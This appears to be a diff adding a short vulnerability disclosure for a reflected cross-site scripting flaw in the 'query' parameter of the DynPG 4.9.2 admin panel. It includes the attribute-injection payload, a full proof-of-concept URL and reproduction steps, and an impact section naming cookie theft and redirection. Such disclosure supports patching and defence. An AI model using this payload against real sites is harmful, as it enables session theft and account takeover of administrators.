@@ -1,0 +1,19 @@
+Description
+
+A cross-site scripting (XSS) issue in the DynPG admin login panel version 4.9.2 allows remote attackers to inject JavaScript via the "query" Parameter
+___
+XSS Payload: x"%20onmouseover=alert(4)%20x="
+___
+Vulnerable URI: query
+___
+Steps to Reproduce the Issue:
+
+1- Login to DynPG admin panel
+2- Paste below POC:
+https://localhost/dynpg/backendpopup/popup.php?limit=&orderby=&page=&popUpResource=texts&query=x"%20onmouseover=alert(4)%20x="&refID=&returnCall=&sort=&valueID=
+As you can see, XSS is triggered.
+
+Video POC: 
+___
+Impact
+With the help of xss attacker can perform social engineering on users by redirecting them from real website to fake one. Attacker can steal their cookies leading to account takeover and download a malware on their system, and there are many more attacking scenarios a skilled attacker can perform with xss.
